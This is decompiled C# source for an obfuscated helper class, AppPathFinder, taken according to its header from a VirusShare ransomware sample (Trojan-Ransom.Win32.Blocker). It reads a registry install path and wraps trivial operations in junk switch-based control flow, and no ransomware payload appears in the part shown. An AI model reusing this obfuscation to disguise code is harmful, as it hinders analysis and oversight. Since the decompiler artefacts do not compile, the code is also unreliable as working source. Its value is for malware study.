// Decompiled with JetBrains decompiler
// Type: SmartAssembly.Shared.AppPathFinder
// Assembly: o4tdggb3, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: FA0844EB-EF82-404C-B76C-C092ABDB9392
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\Trojan-Ransom.Win32.Blocker.bzqq-b74e3dc76fae79b75c26f27ecb85aae1eae4082a42bfa080f7805f32dedc9d67.exe

using Microsoft.Win32;
using SmartAssembly.SmartExceptionsCore;
using System;
using System.Globalization;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Policy;
using Ⴈ;

namespace SmartAssembly.Shared
{
  public class AppPathFinder
  {
    public static string ReadInstalledSaPath()
    {
      int num1;
      RegistryKey registryKey;
      string str1;
      string str2;
      try
      {
        try
        {
          num1 = 6;
          while (true)
          {
            switch (num1)
            {
              case 0:
              case 7:
                str2 = (string) DoNotPruneTypeAttribute.Ⴃ(registryKey, ႷႭ.ႥႳ(1491049027, 5), (object) null, 723, 747);
                num1 = 8;
                continue;
              case 1:
                goto label_6;
              case 2:
                registryKey = SmartAssembly.SmartExceptionsCore.DoNotObfuscateAttribute.Ⴍ(Registry.LocalMachine, AppRegistryKeys.WowSubkeyApplication, 987, 950);
                num1 = 3;
                continue;
              case 3:
                num1 = registryKey != null ? 7 : 1;
                continue;
              case 4:
                num1 = registryKey != null ? 3 : 2;
                continue;
              case 5:
                goto label_10;
              case 8:
                goto label_8;
              default:
                registryKey = SmartAssembly.SmartExceptionsCore.DoNotObfuscateAttribute.Ⴍ(Registry.LocalMachine, AppRegistryKeys.SubkeyApplication, 963, 942);
                goto case 4;
            }
          }
label_6:
          str1 = (string) null;
          goto label_10;
label_8:
          SmartAssembly.SmartUsageCore.DoNotObfuscateAttribute.Ⴍ(registryKey, 680, 756);
          str1 = str2;
        }
        catch
        {
          str1 = (string) null;
        }
label_10:
        switch (4)
        {
          default:
            return str1;
        }
      }
      catch (Exception ex)
      {
        RegistryKey o1 = registryKey;
        string o2 = str2;
        string o3 = str1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) num1;
        int num2;
        // ISSUE: variable of a boxed type
        __Boxed<int> o5 = (ValueType) num2;
        StackFrameHelper.CreateException5(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5);
        throw;
      }
    }

    public AppPathFinder()
    {
      try
      {
      }
      catch (Exception ex)
      {
        StackFrameHelper.CreateException1(ex, (object) this);
        throw;
      }
    }

    static AppPathFinder()
    {
      try
      {
        SmartAssembly.SmartUsageCore.DoNotPruneAttribute.ႰႣ();
      }
      catch (Exception ex)
      {
        StackFrameHelper.CreateException0(ex);
        throw;
      }
    }

    internal static void Ⴍ(
      [In] Array obj0,
      [In] int obj1,
      [In] Array obj2,
      [In] int obj3,
      [In] int obj4,
      [In] int obj5,
      [In] int obj6)
    {
      int num1;
      try
      {
        num1 = 5;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 1:
              goto label_7;
            case 2:
            case 3:
            case 4:
              num1 = 5;
              continue;
            default:
              int num2;
              switch (obj6 ^ obj5)
              {
                case 26:
                  num2 = 1;
                  break;
                case 27:
                  goto label_8;
                default:
                  num2 = 4;
                  break;
              }
              num1 = num2;
              continue;
          }
        }
label_7:
        Array.Copy(obj0, obj1, obj2, obj3, obj4);
        return;
label_8:
        Buffer.BlockCopy(obj0, obj1, obj2, obj3, obj4);
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        int num3;
        // ISSUE: variable of a boxed type
        __Boxed<int> o2 = (ValueType) num3;
        Array o3 = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) obj1;
        Array o5 = obj2;
        // ISSUE: variable of a boxed type
        __Boxed<int> o6 = (ValueType) obj3;
        // ISSUE: variable of a boxed type
        __Boxed<int> o7 = (ValueType) obj4;
        // ISSUE: variable of a boxed type
        __Boxed<int> o8 = (ValueType) obj5;
        // ISSUE: variable of a boxed type
        __Boxed<int> o9 = (ValueType) obj6;
        StackFrameHelper.CreateException9(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5, (object) o6, (object) o7, (object) o8, (object) o9);
        throw;
      }
    }

    internal static int Ⴐ([In] string obj0, [In] int obj1, [In] int obj2)
    {
      int num1;
      try
      {
label_3:
        int num2;
        switch (obj2 ^ obj1)
        {
          case 55:
            num2 = 4;
            break;
          default:
            num2 = 1;
            break;
        }
        num1 = num2;
        while (true)
        {
          switch (num1)
          {
            case 1:
              num1 = 7;
              continue;
            case 2:
            case 5:
              num1 = 7;
              continue;
            case 4:
            case 6:
              goto label_8;
            case 7:
              goto label_3;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (AppPathFinder.Ⴐ);
              num1 = 7;
              continue;
          }
        }
label_8:
        return obj0.Length;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        string o2 = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> o3 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) obj2;
        StackFrameHelper.CreateException4(ex, (object) o1, (object) o2, (object) o3, (object) o4);
        throw;
      }
    }

    internal static string Ⴅ([In] CultureInfo obj0, [In] int obj1, [In] int obj2)
    {
      int num1;
      try
      {
label_3:
        int num2;
        switch (obj2 ^ obj1)
        {
          case 66:
            num2 = 4;
            break;
          default:
            num2 = 6;
            break;
        }
        num1 = num2;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 5:
              goto label_3;
            case 1:
            case 3:
            case 7:
              num1 = 5;
              continue;
            case 4:
              goto label_8;
            case 6:
              num1 = 5;
              continue;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (AppPathFinder.Ⴅ);
              num1 = 5;
              continue;
          }
        }
label_8:
        return obj0.Name;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        CultureInfo o2 = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> o3 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) obj2;
        StackFrameHelper.CreateException4(ex, (object) o1, (object) o2, (object) o3, (object) o4);
        throw;
      }
    }

    internal static int Ⴈ([In] int obj0, [In] int obj1)
    {
      int num1;
      try
      {
label_3:
        int num2;
        switch (obj1 ^ obj0)
        {
          case 43:
            num2 = 2;
            break;
          default:
            num2 = 5;
            break;
        }
        num1 = num2;
        while (true)
        {
          switch (num1)
          {
            case 1:
            case 6:
              goto label_3;
            case 2:
              goto label_8;
            case 3:
              num1 = 1;
              continue;
            case 5:
              num1 = 1;
              continue;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (AppPathFinder.Ⴈ);
              num1 = 1;
              continue;
          }
        }
label_8:
        return IntPtr.Size;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o2 = (ValueType) obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> o3 = (ValueType) obj1;
        StackFrameHelper.CreateException3(ex, (object) o1, (object) o2, (object) o3);
        throw;
      }
    }

    internal static bool Ⴄ([In] IntPtr obj0, [In] IntPtr obj1, [In] int obj2, [In] int obj3)
    {
      int num1;
      try
      {
label_3:
        int num2;
        switch (obj3 ^ obj2)
        {
          case 73:
            num2 = 1;
            break;
          default:
            num2 = 0;
            break;
        }
        num1 = num2;
        while (true)
        {
          switch (num1)
          {
            case 0:
              num1 = 3;
              continue;
            case 1:
            case 7:
              goto label_8;
            case 2:
            case 6:
              num1 = 3;
              continue;
            case 3:
            case 5:
              goto label_3;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (AppPathFinder.Ⴄ);
              num1 = 3;
              continue;
          }
        }
label_8:
        return obj0 != obj1;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        // ISSUE: variable of a boxed type
        __Boxed<IntPtr> o2 = (ValueType) obj0;
        // ISSUE: variable of a boxed type
        __Boxed<IntPtr> o3 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) obj2;
        // ISSUE: variable of a boxed type
        __Boxed<int> o5 = (ValueType) obj3;
        StackFrameHelper.CreateException5(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5);
        throw;
      }
    }

    internal static Evidence Ⴀ([In] Assembly obj0, [In] int obj1, [In] int obj2)
    {
label_0:
      try
      {
        switch ((obj2 ^ obj1) - 78)
        {
          case 0:
            return obj0.Evidence;
          default:
            goto label_0;
        }
      }
      catch (Exception ex)
      {
        Assembly o1 = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> o2 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o3 = (ValueType) obj2;
        StackFrameHelper.CreateException3(ex, (object) o1, (object) o2, (object) o3);
        throw;
      }
    }

    [StructLayout(LayoutKind.Auto)]
    internal struct Ⴗ
    {
      internal int Ⴃ;
      internal int Ⴗ;
      internal int Ⴓ;
      internal int Ⴈ;
      internal int Ⴄ;
      internal bool Ⴅ;
    }

    [StructLayout(LayoutKind.Auto)]
    internal struct Ⴃ
    {
      internal SecurityException Ⴈ;
      internal string Ⴀ;
      internal bool Ⴄ;
      internal bool Ⴐ;
      internal bool Ⴃ;
    }
  }
}
